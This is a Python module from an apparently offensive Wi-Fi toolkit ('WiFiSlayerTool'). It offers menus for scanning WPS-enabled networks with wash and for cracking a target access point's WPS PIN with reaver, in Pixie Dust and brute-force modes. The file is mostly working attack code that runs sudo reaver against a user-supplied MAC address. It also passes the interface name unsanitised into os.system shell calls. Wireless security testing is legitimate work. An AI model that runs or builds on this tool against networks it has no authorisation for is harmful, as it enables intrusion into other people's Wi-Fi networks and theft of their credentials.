# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — WPS Attack Module
Exploit WPS vulnerabilities using Reaver and Pixie Dust.
"""

import os

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
    confirm_action,
)
from core.validator import safe_input, validate_mac
from core.network import get_wireless_interfaces, enable_monitor_mode
from core.ascii_art import print_wps_art
from config import get_text


def wps_menu(current_interface=None):
    """WPS Attack sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "📡", "فحص الشبكات المصابة بثغرة WPS"),
                ("2", "✨", "هجوم Pixie Dust (سريع جداً)"),
                ("3", "🔨", "هجوم Reaver Brute-Force (بطيء)"),
            ]
        else:
            options = [
                ("1", "📡", "Scan for WPS Vulnerable Networks"),
                ("2", "✨", "Pixie Dust Attack (Very Fast)"),
                ("3", "🔨", "Reaver Brute-Force Attack (Slow)"),
            ]

        title = "🔓 " + "WPS Attacks"
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            scan_wps(current_interface)
        elif choice == "2":
            wps_attack(current_interface, mode="pixie")
        elif choice == "3":
            wps_attack(current_interface, mode="reaver")
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def _prepare_interface(interface):
    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
    return interface


def scan_wps(interface=None):
    """Scan for networks with WPS enabled using wash."""
    print_section(get_text("wps_scan"))
    interface = _prepare_interface(interface)
    if not interface:
        print_error(get_text("no_interface"))
        return

    print_info(f"{get_text('scanning_on')} [bold]{interface}[/]... {get_text('press_ctrl_c')}")
    console.print()
    try:
        os.system(f"sudo wash -i {interface}")
    except KeyboardInterrupt:
        console.print()
        print_info(get_text("scan_stopped"))


def wps_attack(interface=None, mode="pixie"):
    """Run WPS attack using Reaver."""
    os.system("clear" if os.name != "nt" else "cls")
    print_wps_art()
    attack_name = "Pixie Dust" if mode == "pixie" else "Reaver Brute-Force"
    print_section(f"WPS Attack: {attack_name}")
    
    interface = _prepare_interface(interface)
    if not interface:
        return

    mac = safe_input(get_text("enter_mac"), validate_mac, console)
    if not mac:
        return

    print_warning(f"{get_text('target')} [bold]{mac}[/]")
    print_warning(f"{get_text('attack')} [bold]{attack_name}[/]")
    console.print()
    if not confirm_action(get_text("confirm_attack")):
        return

    log.info(f"WPS {attack_name} attack on {mac} via {interface}")
    print_info(f"{get_text('starting_attack')} {attack_name} ...")
    console.print()

    try:
        if mode == "pixie":
            # -K 1 specifies Pixie Dust attack in Reaver
            os.system(f"sudo reaver -i {interface} -b {mac} -K 1 -vv")
        else:
            # Standard Reaver brute force
            os.system(f"sudo reaver -i {interface} -b {mac} -vv")
    except KeyboardInterrupt:
        console.print()
        print_info(get_text("attack_stopped"))
